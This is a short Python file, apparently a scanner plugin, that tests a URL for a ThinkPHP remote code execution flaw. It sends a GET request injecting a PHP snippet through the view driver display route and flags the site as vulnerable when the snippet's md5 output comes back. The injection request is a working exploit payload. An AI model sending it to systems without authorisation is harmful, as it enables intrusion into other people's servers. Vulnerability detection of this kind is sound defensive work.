import urllib
import requests


def thinkphp_driver_display_rce(url):
    relsult = {
        'name': 'thinkphp_driver_display_rce',
        'vulnerable': False
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a" in req.text:
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['method'] = 'GET'
            relsult['payload'] = vurl
        return relsult
    except:
        return relsult